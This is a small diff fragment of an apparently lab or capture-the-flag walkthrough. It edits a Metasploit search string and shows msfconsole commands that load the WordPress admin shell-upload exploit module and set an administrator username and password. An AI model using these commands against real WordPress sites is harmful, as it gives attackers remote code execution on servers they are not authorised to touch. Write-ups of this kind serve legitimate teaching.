@@ -199,7 +199,7 @@ $ msfconsole
 ```
 
 ```
-search wp-admin-shell
+search wp admin shell
 use exploit/unix/webapp/wp_admin_shell_upload
 set USERNAME administrator
 set PASSWORD devteam01
